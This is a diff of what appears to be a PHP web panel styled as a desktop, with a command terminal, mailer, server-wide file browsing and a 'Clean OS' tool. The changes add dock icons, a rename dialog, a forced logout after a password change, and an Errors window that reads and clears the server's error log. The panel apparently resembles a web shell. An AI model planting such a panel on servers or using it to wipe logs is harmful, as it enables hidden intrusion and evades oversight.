+        .dock-terminal.app-icon:hover, .dock-notes.app-icon:hover, .dock-browser.app-icon:hover, .dock-cmd.app-icon:hover, .dock-wallpaper.app-icon:hover, .dock-mailer.app-icon:hover, .dock-settings.app-icon:hover, .dock-errors.app-icon:hover, .dock-apptools.app-icon:hover, .dock-clean.app-icon:hover { background: rgba(20,22,26,0.30); }
         .dock-terminal .material-symbols-rounded, .dock-browser .material-symbols-rounded, .dock-wallpaper .material-symbols-rounded { font-size:28px; color:#ffffff; }
         .dock-notes .material-symbols-rounded { font-size:28px; color: Khaki; }
         .dock-cmd .material-symbols-rounded { font-size:28px; color:#ffffff; }
         .dock-mailer .material-symbols-rounded { font-size:28px; color:#4285f4; }
-.dock-settings .material-symbols-rounded { font-size:28px; color:#cfd6df; }
-.dock-terminal .logo-spinner { width:28px; height:28px; }
-.dock-browser .browser-os-icon, .dock-browser .browser-os-icon-2 { width:28px; height:28px; }
+        .dock-settings .material-symbols-rounded { font-size:28px; color:#cfd6df; }
+        .dock-errors .material-symbols-rounded { font-size:28px; color:#E53935; }
+        .dock-apptools .apptools-icon { width:28px; height:28px; }
+        .dock-clean .clean-icon { width:28px; height:28px; }
+        .dock-terminal .logo-spinner { width:28px; height:28px; }
+        .dock-browser .browser-os-icon, .dock-browser .browser-os-icon-2 { width:28px; height:28px; }
         /* Visible labels for dock icons */
-        .dock-terminal::after, .dock-notes::after, .dock-browser::after, .dock-cmd::after, .dock-wallpaper::after, .dock-mailer::after, .dock-settings::after {
+        .dock-terminal::after, .dock-notes::after, .dock-browser::after, .dock-cmd::after, .dock-wallpaper::after, .dock-mailer::after, .dock-settings::after, .dock-errors::after, .dock-apptools::after, .dock-clean::after {
             content: attr(data-label);
             position: absolute;
             top: calc(100% + 6px);
@@ -2909,6 +3238,9 @@ if ($loginFlash) { unset($_SESSION['login_flash']); }
                 </a>
                 <a class="app-icon" href="#" id="cmd-trigger" title="CMD" aria-label="CMD" data-label="CMD">
                     <span class="material-symbols-rounded">terminal</span>
+                </a>
+                <a class="app-icon" href="#" id="errors-trigger" title="Errors" aria-label="Errors" data-label="Errors">
+                    <span class="material-symbols-rounded errors-icon">warning</span>
                 </a>
                 <a class="app-icon" href="#" id="apptools-trigger" title="APPTools 1.0" aria-label="APPTools 1.0" data-label="APPTools 1.0">
                     <svg class="apptools-icon" viewBox="0 0 24 24" role="img" aria-label="APPTools app store icon">
@@ -3077,6 +3409,27 @@ if ($loginFlash) { unset($_SESSION['login_flash']); }
     </div>
     <!-- Layer to hold editor windows -->
     <div id="editor-layer"></div>
+    <!-- Rename popup template -->
+    <div class="rename-window" id="rename-template" role="dialog" aria-label="Rename" style="display:none;">
+        <div class="rename-titlebar">
+            <div class="rename-title">Rename</div>
+            <button class="rename-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
+        </div>
+        <div class="rename-body" style="padding:12px;">
+            <div class="input-pill" style="margin:12px auto; max-width:480px;">
+                <span class="material-symbols-rounded">drive_file_rename_outline</span>
+                <input type="text" class="rename-input" placeholder="Enter new name" autocomplete="off" aria-label="New name">
+            </div>
+        </div>
+        <div class="rename-footer" style="display:flex; align-items:center; justify-content:flex-end; gap:8px; padding:8px 10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.20);">
+            <button class="rename-save" type="button" title="Rename" aria-label="Rename" style="border:1px solid var(--border); border-radius:6px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px;">
+                <span class="material-symbols-rounded" style="color:LawnGreen;">check_circle</span>
+                <span>Rename</span>
+            </button>
+        </div>
+    </div>
+    <!-- Layer to hold rename windows -->
+    <div id="rename-layer"></div>
     <!-- Upload popup template -->
     <div class="upload-window" id="upload-template" role="dialog" aria-label="Upload" style="display:none;">
         <div class="upload-titlebar">
@@ -3232,6 +3585,23 @@ if ($loginFlash) { unset($_SESSION['login_flash']); }
     </div>
     <!-- Layer to hold Clean OS windows -->
     <div id="clean-layer"></div>
+    <!-- Errors popup template -->
+    <div class="errors-window" id="errors-template" role="dialog" aria-label="Errors" style="display:none;">
+        <div class="errors-titlebar">
+            <div class="errors-title"><span class="material-symbols-rounded errors-icon" aria-hidden="true">warning</span> Errors</div>
+            <button class="errors-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
+        </div>
+        <div class="errors-body">
+            <div class="errors-summary" id="errors-summary">Press Scan to analyze the error log.</div>
+            <textarea class="errors-output" id="errors-output" readonly aria-label="Errors output"></textarea>
+            <div class="errors-actions">
+            <button class="btn errors-scan" id="errors-scan-btn" type="button" title="Scan" aria-label="Scan"><span class="material-symbols-rounded">document_scanner</span><span>Scan</span></button>
+            <button class="btn errors-clear" id="errors-clear-btn" type="button" title="Clear Log" aria-label="Clear Log"><span class="material-symbols-rounded">delete</span></button>
+            </div>
+        </div>
+    </div>
+    <!-- Layer to hold Errors windows -->
+    <div id="errors-layer"></div>
     <!-- APPTools 1.0 popup template -->
     <div class="apptools-window" id="apptools-template" role="dialog" aria-label="APPTools 1.0" style="display:none;">
         <div class="apptools-titlebar">
@@ -3239,12 +3609,13 @@ if ($loginFlash) { unset($_SESSION['login_flash']); }
             <button class="apptools-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
         </div>
         <div class="apptools-body">
+            <div class="apptools-card" data-app="errors" title="Open Errors" aria-label="Open Errors"><span class="material-symbols-rounded errors-icon">warning</span><span class="label">Errors</span></div>
+            <div class="apptools-card" data-app="clean" title="Open Clean OS" aria-label="Open Clean OS"><span class="material-symbols-rounded">cleaning_bucket</span><span class="label">Clean OS</span></div>
             <div class="apptools-card" data-app="notes" title="Open Notes" aria-label="Open Notes"><span class="material-symbols-rounded">edit_note</span><span class="label">Notes</span></div>
             <div class="apptools-card" data-app="mailer" title="Open Mailer" aria-label="Open Mailer"><span class="material-symbols-rounded">mail</span><span class="label">Mailer</span></div>
             <div class="apptools-card" data-app="browser" title="Open Browser" aria-label="Open Browser"><span class="material-symbols-rounded">public</span><span class="label">Browser</span></div>
             <div class="apptools-card" data-app="wallpaper" title="Open Wallpaper" aria-label="Open Wallpaper"><span class="material-symbols-rounded">wallpaper</span><span class="label">Wallpaper</span></div>
             <div class="apptools-card" data-app="cmd" title="Open CMD" aria-label="Open CMD"><span class="material-symbols-rounded">terminal</span><span class="label">CMD</span></div>
-            <div class="apptools-card" data-app="clean" title="Open Clean OS" aria-label="Open Clean OS"><span class="material-symbols-rounded">cleaning_bucket</span><span class="label">Clean OS</span></div>
             <div class="apptools-card" data-app="trash" title="Open Trash" aria-label="Open Trash"><span class="material-symbols-rounded">delete</span><span class="label">Trash</span></div>
             <div class="apptools-card" data-app="settings" title="Open Settings" aria-label="Open Settings"><span class="material-symbols-rounded">settings</span><span class="label">Settings</span></div>
             <div class="apptools-card" data-app="about" title="Open About" aria-label="Open About"><span class="material-symbols-rounded">account_circle</span><span class="label">About</span></div>
@@ -3366,6 +3737,52 @@ if ($loginFlash) { unset($_SESSION['login_flash']); }
     <div id="wallpaper-dock" role="dialog" aria-label="Wallpaper Dock" style="display:none;">
         <button class="dock-wallpaper app-icon" id="dock-wallpaper-btn" type="button" title="Wallpaper" aria-label="Open Wallpaper" data-label="Wallpaper">
             <span class="material-symbols-rounded" aria-hidden="true">wallpaper</span>
+        </button>
+    </div>
+    <!-- Errors dock icon -->
+    <div id="errors-dock" role="dialog" aria-label="Errors Dock" style="display:none;">
+        <button class="dock-errors app-icon" id="dock-errors-btn" type="button" title="Errors" aria-label="Open Errors" data-label="Errors">
+            <span class="material-symbols-rounded errors-icon" aria-hidden="true">warning</span>
+        </button>
+    </div>
+    <!-- APPTools dock icon -->
+    <div id="apptools-dock" role="dialog" aria-label="APPTools Dock" style="display:none;">
+        <button class="dock-apptools app-icon" id="dock-apptools-btn" type="button" title="APPTools 1.0" aria-label="Open APPTools 1.0" data-label="APPTools 1.0">
+            <svg class="apptools-icon" viewBox="0 0 24 24" role="img" aria-label="APPTools app store icon">
+                <defs>
+                    <linearGradient id="apptoolsGradDock" x1="0" y1="0" x2="1" y2="1">
+                        <stop offset="0%" stop-color="LawnGreen"/>
+                        <stop offset="100%" stop-color="#2ecc71"/>
+                    </linearGradient>
+                </defs>
+                <g fill="none" stroke="url(#apptoolsGradDock)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M7 9 h10 c1 0 1 1 1 2 v6 c0 1 -1 2 -2 2 H8 c-1 0 -2 -1 -2 -2 v-6 c0 -1 0 -2 1 -2 z" />
+                    <path d="M9 9 c0 -2 1.5 -3 3 -3 s3 1 3 3" />
+                    <circle cx="17.5" cy="8.5" r="2.2" />
+                    <path d="M17.5 7.6 l0.6 1.2 l1.3 0.2 l-1 0.9 l0.2 1.3 l-1.1 -0.6 l-1.1 0.6 l0.2 -1.3 l-1 -0.9 l1.3 -0.2 z" />
+                </g>
+            </svg>
+        </button>
+    </div>
+    <!-- Clean OS dock icon -->
+    <div id="clean-dock" role="dialog" aria-label="Clean Dock" style="display:none;">
+        <button class="dock-clean app-icon" id="dock-clean-btn" type="button" title="Clean OS" aria-label="Open Clean OS" data-label="Clean OS">
+            <svg class="clean-icon" viewBox="0 0 24 24" role="img" aria-label="Clean OS icon">
+                <defs>
+                    <linearGradient id="cleanGradDock" x1="0" y1="0" x2="1" y2="1">
+                        <stop offset="0%" stop-color="LawnGreen"/>
+                        <stop offset="100%" stop-color="#2ecc71"/>
+                    </linearGradient>
+                </defs>
+                <g fill="none" stroke="url(#cleanGradDock)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path class="broom-stick" d="M4 20 L18 6"/>
+                    <path class="broom-head" d="M16 8 C15 10, 13 12, 11 13"/>
+                    <path class="broom-bristle" d="M12 12 C11 13, 9 14, 7 15"/>
+                    <circle class="sparkle s1" cx="8" cy="6" r="1"/>
+                    <circle class="sparkle s2" cx="20" cy="12" r="1.2"/>
+                    <circle class="sparkle s3" cx="12" cy="20" r="1"/>
+                </g>
+            </svg>
         </button>
     </div>
     <!-- Trash dock icon removed: Trash remains available via header only -->
@@ -3928,6 +4345,13 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
           var mailDock = document.getElementById('mailer-dock');
           var settingsDockBtn = document.getElementById('dock-settings-btn');
           var settingsDock = document.getElementById('settings-dock');
+          // New dock icons: Errors, APPTools, Clean OS
+          var errorsDockBtn = document.getElementById('dock-errors-btn');
+          var errorsDock = document.getElementById('errors-dock');
+          var apptoolsDockBtn = document.getElementById('dock-apptools-btn');
+          var apptoolsDock = document.getElementById('apptools-dock');
+          var cleanDockBtn = document.getElementById('dock-clean-btn');
+          var cleanDock = document.getElementById('clean-dock');
           var dragging = false, offsetX = 0, offsetY = 0;
           var dockPos = null; // remember last position while minimized
           var lastTapTime = 0; // for touch double-tap
@@ -3958,6 +4382,42 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
               btn.classList.remove('label-top');
             }
           }
+          // Errors dock behavior
+          if (errorsDockBtn) {
+            errorsDockBtn.addEventListener('click', function(ev){
+              ev.preventDefault();
+              var trigger = document.getElementById('errors-trigger');
+              if (trigger) { trigger.click(); } else if (typeof spawnErrorsWindow === 'function') { spawnErrorsWindow(); }
+            });
+            errorsDockBtn.addEventListener('touchend', function(ev){
+              var trigger = document.getElementById('errors-trigger');
+              if (trigger) { trigger.click(); } else if (typeof spawnErrorsWindow === 'function') { spawnErrorsWindow(); }
+            }, { passive: true });
+          }
+          // APPTools dock behavior
+          if (apptoolsDockBtn) {
+            apptoolsDockBtn.addEventListener('click', function(ev){
+              ev.preventDefault();
+              var trigger = document.getElementById('apptools-trigger');
+              if (trigger) { trigger.click(); } else if (typeof spawnAppToolsWindow === 'function') { spawnAppToolsWindow(); }
+            });
+            apptoolsDockBtn.addEventListener('touchend', function(ev){
+              var trigger = document.getElementById('apptools-trigger');
+              if (trigger) { trigger.click(); } else if (typeof spawnAppToolsWindow === 'function') { spawnAppToolsWindow(); }
+            }, { passive: true });
+          }
+          // Clean OS dock behavior
+          if (cleanDockBtn) {
+            cleanDockBtn.addEventListener('click', function(ev){
+              ev.preventDefault();
+              var trigger = document.getElementById('clean-trigger');
+              if (trigger) { trigger.click(); } else if (typeof spawnCleanWindow === 'function') { spawnCleanWindow(); }
+            });
+            cleanDockBtn.addEventListener('touchend', function(ev){
+              var trigger = document.getElementById('clean-trigger');
+              if (trigger) { trigger.click(); } else if (typeof spawnCleanWindow === 'function') { spawnCleanWindow(); }
+            }, { passive: true });
+          }
           // Position dock icons in a centered 2x4 grid by default (movable later)
           function positionDockRow(){
             var centerX = window.innerWidth / 2;
@@ -3966,6 +4426,7 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
             var spacingY = 140;  // vertical spacing between rows (icon + label gap)
             var row1Top = Math.round(centerY - (spacingY/2));
             var row2Top = Math.round(centerY + (spacingY/2)); // symmetric below center
+            var row3Top = Math.round(centerY + (spacingY * 1.5)); // extra row for new apps
 
             // Top row (left ➜ right): Settings, Wallpaper, Mailer
             if (settingsDockBtn && !settingsDockPos) {
@@ -4033,6 +4494,34 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
               notesDockBtn.style.top = row2Top + 'px';
               updateDockLabelPosition(notesDockBtn);
             }
+            // Third row (left ➜ right): Errors, APPTools 1.0, Clean OS
+            if (errorsDockBtn) {
+              var errW = errorsDockBtn.offsetWidth || 48;
+              var errLeft = centerX - spacingX - (errW/2);
+              errorsDockBtn.style.transition = 'none';
+              errorsDockBtn.style.transform = 'none';
+              errorsDockBtn.style.left = errLeft + 'px';
+              errorsDockBtn.style.top = row3Top + 'px';
+              updateDockLabelPosition(errorsDockBtn);
+            }
+            if (apptoolsDockBtn) {
+              var appTW = apptoolsDockBtn.offsetWidth || 48;
+              var appTLeft = centerX - (appTW/2);
+              apptoolsDockBtn.style.transition = 'none';
+              apptoolsDockBtn.style.transform = 'none';
+              apptoolsDockBtn.style.left = appTLeft + 'px';
+              apptoolsDockBtn.style.top = row3Top + 'px';
+              updateDockLabelPosition(apptoolsDockBtn);
+            }
+            if (cleanDockBtn) {
+              var cleanW = cleanDockBtn.offsetWidth || 48;
+              var cleanLeft = centerX + spacingX - (cleanW/2);
+              cleanDockBtn.style.transition = 'none';
+              cleanDockBtn.style.transform = 'none';
+              cleanDockBtn.style.left = cleanLeft + 'px';
+              cleanDockBtn.style.top = row3Top + 'px';
+              updateDockLabelPosition(cleanDockBtn);
+            }
           }
           if (minimizeBtn) {
             minimizeBtn.addEventListener('click', function(){
@@ -4044,6 +4533,9 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
               if (mailDock) mailDock.style.display = 'block';
               if (wpDock) wpDock.style.display = 'block';
               if (settingsDock) settingsDock.style.display = 'block';
+              if (errorsDock) errorsDock.style.display = 'block';
+              if (apptoolsDock) apptoolsDock.style.display = 'block';
+              if (cleanDock) cleanDock.style.display = 'block';
               if (dockBtn) {
                 if (dockPos) {
                   dockBtn.style.transform = 'none';
@@ -4131,6 +4623,9 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
           if (mailDock) mailDock.style.display = 'none';
           if (wpDock) wpDock.style.display = 'none';
           if (settingsDock) settingsDock.style.display = 'none';
+          if (errorsDock) errorsDock.style.display = 'none';
+          if (apptoolsDock) apptoolsDock.style.display = 'none';
+          if (cleanDock) cleanDock.style.display = 'none';
             });
             // Touch: single-tap to restore
             dockBtn.addEventListener('touchend', function(ev){
@@ -4143,6 +4638,9 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
               if (mailDock) mailDock.style.display = 'none';
               if (wpDock) wpDock.style.display = 'none';
               if (settingsDock) settingsDock.style.display = 'none';
+              if (errorsDock) errorsDock.style.display = 'none';
+              if (apptoolsDock) apptoolsDock.style.display = 'none';
+              if (cleanDock) cleanDock.style.display = 'none';
             }, { passive: true });
             // Drag handlers
             function startDrag(ev){
@@ -4558,6 +5056,9 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
             updateDockLabelPosition(cmdDockBtn);
             updateDockLabelPosition(wpDockBtn);
             updateDockLabelPosition(settingsDockBtn);
+            updateDockLabelPosition(errorsDockBtn);
+            updateDockLabelPosition(apptoolsDockBtn);
+            updateDockLabelPosition(cleanDockBtn);
           
             // If minimized and icons haven't been dragged, keep them aligned in a row
             if (document.body.classList.contains('minimized')) {
@@ -4835,6 +5336,122 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
             if (closeBtn) { closeBtn.addEventListener('click', function(){ overlay.classList.remove('show'); }); }
             document.addEventListener('keydown', function(e){ if (e.key === 'Escape') overlay.classList.remove('show'); }, { once: true });
         }
+    })();
+    </script>
+
+    <script>
+    // Errors popup functionality
+    (function(){
+        var trigger = document.getElementById('errors-trigger');
+        var template = document.getElementById('errors-template');
+        var layer = document.getElementById('errors-layer');
+
+        async function scanErrors(win){
+            try {
+                var summary = win.querySelector('#errors-summary');
+                var output = win.querySelector('#errors-output');
+                if (output) { output.value = '$ scanning errors...\n'; }
+                var resp = await fetch('?api=errors_log', { credentials:'same-origin' });
+                var j = await resp.json().catch(function(){ return { success:false }; });
+                if (!j || !j.success) { if (summary) summary.textContent = 'Failed to scan error log'; if (output) output.value += 'scan: failed to read log\n'; return; }
+                var meta = 'Log: ' + (j.path || '(unknown)') + (j.exists ? (' — ' + j.size + ' bytes') : ' — (missing)');
+                if (summary) summary.textContent = meta;
+                var lines = [];
+                lines.push('$ found ' + String((j.entries||[]).length) + ' entries in ' + String((j.groups||[]).length) + ' files');
+                (j.entries || []).forEach(function(e){
+                    var sev = e.severity || 'PHP';
+                    var msg = e.message || '';
+                    var file = e.file || '';
+                    var ln = e.line || '';
+                    var ts = e.ts ? (' [' + e.ts + ']') : '';
+                    var loc = file ? (' -> ' + file + (ln ? (':' + String(ln)) : '')) : '';
+                    lines.push('[' + sev + '] ' + msg + loc + ts);
+                });
+                if (output) {
+                    output.value += lines.join('\n') + '\n';
+                    output.scrollTop = output.scrollHeight;
+                }
+            } catch(e){}
+        }
+
+        function spawnErrorsWindow(){
+            if (!template || !layer) return null;
+            var win = template.cloneNode(true);
+            win.removeAttribute('id');
+            win.style.display = '';
+            win.classList.add('show');
+            layer.appendChild(win);
+            try { localStorage.setItem('app.errors.open', '1'); } catch(e){}
+            // Center initial position
+            try {
+                var ew = win.offsetWidth || 560;
+                var eh = win.offsetHeight || 360;
+                var left = Math.max(6, Math.min(window.innerWidth - ew - 6, Math.round((window.innerWidth - ew) / 2)));
+                var top = Math.max(6, Math.min(window.innerHeight - eh - 6, Math.round((window.innerHeight - eh) / 2)));
+                win.style.left = left + 'px';
+                win.style.top = top + 'px';
+            } catch(e) {}
+
+            var titlebar = win.querySelector('.errors-titlebar');
+            var closeBtn = win.querySelector('.errors-close');
+            var scanBtn = win.querySelector('.errors-scan');
+            var clearBtn = win.querySelector('.errors-clear');
+            var summary = win.querySelector('#errors-summary');
+            var output = win.querySelector('#errors-output');
+
+            // Dragging
+            var dragging = false, ox = 0, oy = 0;
+            function onDown(ev){
+                dragging = true;
+                var p = ev.touches ? ev.touches[0] : ev;
+                var rect = win.getBoundingClientRect();
+                ox = p.clientX - rect.left; oy = p.clientY - rect.top;
+                document.addEventListener('mousemove', onMove);
+                document.addEventListener('mouseup', onUp);
+            }
+            function onMove(ev){
+                if (!dragging) return;
+                var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, ev.clientX - ox));
+                var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, ev.clientY - oy));
+                win.style.left = x + 'px';
+                win.style.top = y + 'px';
+            }
+            function onUp(){
+                dragging = false;
+                document.removeEventListener('mousemove', onMove);
+                document.removeEventListener('mouseup', onUp);
+            }
+            titlebar && titlebar.addEventListener('mousedown', onDown);
+
+            closeBtn && closeBtn.addEventListener('click', function(){
+                win.remove();
+                try { localStorage.setItem('app.errors.open', '0'); } catch(e){}
+            });
+            scanBtn && scanBtn.addEventListener('click', function(){
+                if (output) { output.value = ''; }
+                if (summary) { summary.textContent = 'Scanning...'; }
+                scanErrors(win);
+            });
+            clearBtn && clearBtn.addEventListener('click', async function(){
+                try {
+                    var r = await fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body:'api=errors_clear' });
+                    var j = await r.json();
+                    if (j && j.success) {
+                        if (output) { output.value = '$ log cleared\n'; }
+                        if (summary) { summary.textContent = 'Log cleared. Press Scan to analyze again.'; }
+                    } else { alert('Failed to clear log'); }
+                } catch(e){ alert('Failed to clear log'); }
+            });
+
+            // Do not auto-scan on open; wait for user to click Scan
+            return win;
+        }
+
+        // Restore previously open state (opens window but does not auto-scan)
+        try { if (localStorage.getItem('app.errors.open') === '1') { spawnErrorsWindow(); } } catch(e){}
+
+        trigger && trigger.addEventListener('click', function(e){ e.preventDefault(); spawnErrorsWindow(); });
+        window.spawnErrorsWindow = spawnErrorsWindow;
     })();
     </script>
 
@@ -5566,6 +6183,81 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
             if (a.classList.contains('btn-edit') && (href.indexOf('edit=1') !== -1 || href.indexOf('edit_abs=1') !== -1)){
                 ev.preventDefault();
                 openEditorFromHref(href);
+            }
+        }, true);
+        // Rename popup
+        function spawnRenameWindow(opts){
+            var tpl = document.getElementById('rename-template');
+            var layer = document.getElementById('rename-layer');
+            if (!tpl || !layer) return null;
+            var win = tpl.cloneNode(true);
+            win.removeAttribute('id');
+            win.style.display = '';
+            win.classList.add('show');
+            layer.appendChild(win);
+            var titleEl = win.querySelector('.rename-title');
+            var input = win.querySelector('.rename-input');
+            var saveBtn = win.querySelector('.rename-save');
+            var closeBtn = win.querySelector('.rename-close');
+            if (titleEl) titleEl.textContent = opts && opts.title ? opts.title : 'Rename';
+            if (input && opts && opts.prefill) input.value = opts.prefill;
+            function doRename(){
+                var newName = (input && input.value) || '';
+                newName = newName.trim();
+                if (!newName){ try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify('New name cannot be empty', true); } catch(e){} return; }
+                var form = document.createElement('form');
+                form.method = 'POST';
+                form.action = opts && opts.action ? opts.action : window.location.pathname;
+                function add(name, value){ var inp = document.createElement('input'); inp.type = 'hidden'; inp.name = name; inp.value = value; form.appendChild(inp); }
+                var fields = opts && opts.fields || {};
+                Object.keys(fields).forEach(function(k){ add(k, fields[k]); });
+                add('newname', newName);
+                document.body.appendChild(form);
+                form.submit();
+            }
+            saveBtn && saveBtn.addEventListener('click', function(){ doRename(); });
+            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
+            // Drag by titlebar
+            var titlebar = win.querySelector('.rename-titlebar');
+            var dragging = false, ox = 0, oy = 0;
+            function onDown(ev){ dragging = true; var p = ev.touches ? ev.touches[0] : ev; var rect = win.getBoundingClientRect(); ox = p.clientX - rect.left; oy = p.clientY - rect.top; document.body.style.userSelect = 'none'; document.addEventListener('mousemove', onMove); document.addEventListener('touchmove', onMove, { passive:false }); document.addEventListener('mouseup', onUp); document.addEventListener('touchend', onUp); }
+            function onMove(ev){ if (!dragging) return; if (ev.cancelable) ev.preventDefault(); var p = ev.touches ? ev.touches[0] : ev; var left = p.clientX - ox; var top = p.clientY - oy; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left < 8) left = 8; if (top < 8) top = 8; if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop; win.style.left = left + 'px'; win.style.top = top + 'px'; }
+            function onUp(){ if (!dragging) return; dragging = false; document.body.style.userSelect = ''; document.removeEventListener('mousemove', onMove); document.removeEventListener('touchmove', onMove); document.removeEventListener('mouseup', onUp); document.removeEventListener('touchend', onUp); }
+            titlebar && titlebar.addEventListener('mousedown', onDown);
+            titlebar && titlebar.addEventListener('touchstart', onDown, { passive:true });
+            return win;
+        }
+        function openRenameFromHref(href){
+            try {
+                var u = new URL(href, window.location.href);
+                var rel = u.searchParams.get('d') || '';
+                var os = u.searchParams.get('os') || '';
+                var isAbs = !!u.searchParams.get('rename_abs');
+                var name = baseName(rel || os);
+                // After rename, go to directory listing
+                var action;
+                if (rel) {
+                    var idx = rel.lastIndexOf('/');
+                    var dirRel = idx > -1 ? rel.slice(0, idx) : '';
+                    action = window.location.pathname + (dirRel ? ('?d=' + encodeURIComponent(dirRel)) : '');
+                } else {
+                    var parts = os.split(/[\\\/]/);
+                    parts.pop();
+                    var dirAbs = parts.join('/');
+                    action = window.location.pathname + '?os=' + encodeURIComponent(dirAbs);
+                }
+                var fields = rel ? { 'do_rename':'1', 'rel': rel } : { 'do_rename_abs':'1', 'os': os };
+                spawnRenameWindow({ title: 'Rename: ' + name, action: action, fields: fields, prefill: name });
+            } catch(e){}
+        }
+        // Intercept Rename buttons
+        document.addEventListener('click', function(ev){
+            var a = ev.target && ev.target.closest && ev.target.closest('a');
+            if (!a) return;
+            var href = a.getAttribute('href') || '';
+            if (a.classList.contains('btn-rename') && (href.indexOf('rename=1') !== -1 || href.indexOf('rename_abs=1') !== -1)){
+                ev.preventDefault();
+                openRenameFromHref(href);
             }
         }, true);
         })();
@@ -6560,6 +7252,12 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
                             } catch(e) {}
                             // Keep window open and persist open flag
                             try { localStorage.setItem('app.settings.open', '1'); } catch(e){}
+                            // Force logout so user must re-enter the new password
+                            setTimeout(function(){
+                                var target = window.location.pathname + '?logout=1';
+                                // Use assign to add to history for back navigation
+                                window.location.assign(target);
+                            }, 600);
                         } else {
                             try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify((j && j.error) || 'Failed to update password', true); } catch(e){}
                         }
@@ -6649,6 +7347,7 @@ echo '<input type="hidden" name="os" value="' . h($dirPath) . '">';
                 clean: function(){ try { if (typeof spawnCleanWindow==='function') spawnCleanWindow(); else document.getElementById('clean-trigger') && document.getElementById('clean-trigger').click(); } catch(e){} },
                 trash: function(){ try { if (typeof spawnTrashWindow==='function') spawnTrashWindow(); else document.getElementById('trash-trigger') && document.getElementById('trash-trigger').click(); } catch(e){} },
                 settings: function(){ try { if (typeof spawnSettingsWindow==='function') spawnSettingsWindow(); else document.getElementById('settings-trigger') && document.getElementById('settings-trigger').click(); } catch(e){} },
+                errors: function(){ try { if (typeof spawnErrorsWindow==='function') spawnErrorsWindow(); else document.getElementById('errors-trigger') && document.getElementById('errors-trigger').click(); } catch(e){} },
                 about: function(){ try { var aboutTrigger = document.getElementById('about-trigger'); if (aboutTrigger) aboutTrigger.click(); else { var overlay = document.getElementById('about-overlay'); if (overlay){ overlay.style.display=''; overlay.classList && overlay.classList.add('show'); } } } catch(e){} }
             };
             try {
